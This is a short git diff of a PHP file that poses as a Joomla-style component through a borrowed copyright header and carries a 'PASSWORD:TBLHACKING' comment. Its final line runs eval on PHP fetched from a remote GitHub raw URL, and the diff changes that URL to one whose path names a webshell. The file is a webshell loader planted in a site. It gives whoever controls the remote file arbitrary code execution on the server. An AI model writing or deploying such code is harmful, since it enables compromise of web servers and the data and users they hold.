@@ -1,4 +1,5 @@
 <?php
+
 /** * PASSWORD:TBLHACKING */
 /** *-- copyright : kurdhaxor */
 /** * @package kurdhaxor * @copyright Copyright (C) 2025 Open Source Matters, Inc. All rights reserved. * */
@@ -24,5 +25,5 @@ function getBacklink($url)
     }
 }
 
-eval("?>" . getBacklink("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/gafa.php"));
+eval("?>" . getBacklink("https://raw.githubusercontent.com/DOYOUMISSME/webshell/refs/heads/main/0x.php"));
 ?>
